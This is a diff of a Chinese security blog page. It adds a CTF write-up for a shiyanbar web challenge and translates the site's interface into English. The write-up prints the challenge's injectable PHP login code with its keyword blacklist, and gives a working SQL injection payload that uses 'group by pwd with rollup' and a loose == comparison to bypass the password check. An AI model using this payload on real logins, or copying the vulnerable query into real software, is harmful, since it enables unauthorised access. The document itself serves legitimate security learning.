@@ -15,13 +15,16 @@
 
 
 
+<meta name="description" content="web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识">
 <meta property="og:type" content="article">
 <meta property="og:title" content="因缺思汀的绕过">
 <meta property="og:url" content="http://isron.dropsec.xyz/2017/04/05/shiyanbar/index.html">
 <meta property="og:site_name" content="Isron">
-<meta property="og:updated_time" content="2017-04-05T03:17:59.196Z">
+<meta property="og:description" content="web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识">
+<meta property="og:updated_time" content="2017-04-05T09:08:38.761Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="因缺思汀的绕过">
+<meta name="twitter:description" content="web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -154,13 +157,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
+                        <li>Menu</li>
+                        <li>Tags</li>
                         
-                        <li>友情链接</li>
+                        <li>Friends</li>
                         
                         
-                        <li>关于我</li>
+                        <li>About Me</li>
                         
                     </ul>
                 </div>
@@ -199,7 +202,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSP/">CSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP序列化/">PHP序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA1/">SHA1</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WAF/">WAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/命令执行/">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/总结/">总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境配置/">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读书笔记/">读书笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSP/">CSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MYSQL/">MYSQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP序列化/">PHP序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SHA1/">SHA1</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WAF/">WAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/命令执行/">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/总结/">总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境配置/">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读书笔记/">读书笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
                     </div>
                 </section>
                 
@@ -274,7 +277,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
       <div class="body-wrap"><article id="post-shiyanbar" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -305,6 +308,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MYSQL/">MYSQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -312,7 +319,11 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <p>web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识<a id="more"></a><br>URL:<code>http://ctf5.shiyanbar.com/web/pcat/index.php</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>代码看起来不难，在数据库中做一个查询如果用户名密码全部相同则返回<code>flag</code>，如果用户名相同则返回<code>亦可赛艇</code>,再或者返回<code>一颗赛艇</code>，并且过滤了很多sql关键字。<br>sql语句：<code>SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;</code>发现只对uname进行了查询，而且or没有被过滤，那么就可以利用or构造一个万能用户名<code>&#39; or 1=1 limit 1 #</code>，发现返回<code>亦可赛艇</code>说明绕过了第一个是否存在用户名的权限。<br>第二步则是绕过密码相比较，可以发现在pwd比较时<code>if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;])</code>，用的是双等号，那么说明是存在弱类型的，可以利用NULL == 空字符串那么就可以利用<code>with rollup</code><br>payload：<code>uname=&#39;or 1 group by pwd with rollup limit 1 OFFSET 2#&amp;pwd=</code><br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">group</span> <span class="title">by</span> pwd with rollup : 对pwd进行<span class="keyword">group</span> <span class="title">by</span> 排序，且将最后一个再输出出来赋值为NULL</div><div class="line">limit <span class="number">1</span> OFFSET <span class="number">2</span> ： 从第三个开始取，取一位</div></pre></td></tr></table></figure></p>
+<p>由于共有两个用户，所以在<code>group by pwd with rollup</code>时会生成第三个pwd为NULL的数据，然后进行选取得到pwd为NULL，NULL == 空字符串，成功绕过得到flag</p>
+<p>limit 与 offset：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="section">mysql&gt; select * from users limit 1,1;</span></div><div class="line">+----+----------+------------+</div><div class="line"><span class="section">| id | username | password   |</span></div><div class="line">+----+----------+------------+</div><div class="line"><span class="section">|  2 | Angelina | I-kill-you |</span></div><div class="line">+----+----------+------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql默认从第0个开始所以取第二位，第二个参数是取一个</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 1;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">|  1 | Dumb     | Dumb     |</span></div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">只取一位</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 1 offset 2;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">|  3 | Dummy    | p@ssword |</span></div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">从第三个开始取一位</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 2 offset 2;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line"><span class="section">|  4 | secure   | crappy   |</span></div><div class="line">+----+----------+----------+</div><div class="line">2 rows in set (0.00 sec)</div><div class="line">从第三个开始取两位</div></pre></td></tr></table></figure></p>
+
       
     </div>
     
@@ -320,17 +331,17 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/05/shiyanbar/">因缺思汀的绕过</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
-        <p><span>发布时间:</span>2017-04-05, 10:45:47</p>
-        <p><span>最后更新:</span>2017-04-05, 11:17:59</p>
+        <p><span>Title:</span><a href="/2017/04/05/shiyanbar/">因缺思汀的绕过</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">Isron</a></p>
+        <p><span>Created:</span>2017-04-05, 10:45:47</p>
+        <p><span>Updated:</span>2017-04-05, 17:08:38</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/05/shiyanbar/" title="因缺思汀的绕过">http://isron.dropsec.xyz/2017/04/05/shiyanbar/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://isron.dropsec.xyz/2017/04/05/shiyanbar/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2017/04/05/shiyanbar/" title="因缺思汀的绕过">http://isron.dropsec.xyz/2017/04/05/shiyanbar/</a>
+            <span class="copy-path" data-clipboard-text="From http://isron.dropsec.xyz/2017/04/05/shiyanbar/　　By Isron" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
         </p>
     </div>
 
@@ -351,7 +362,7 @@
 </article>
 
     <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
+        <strong class="toc-title">Contents</strong>
         
             
         
@@ -367,10 +378,10 @@
         }
     </style>
 
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
 
     <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
     </script>
 
 
@@ -411,13 +422,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/03/30/natas/" title="下一篇: natas部分题解">
+            <a href="/2017/03/30/natas/" title="Next: natas部分题解">
                 <i class="fa fa-angle-right"></i>
             </a>
         
@@ -440,14 +451,14 @@
                 2016-2017 Isron
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -456,7 +467,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -489,9 +500,9 @@
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
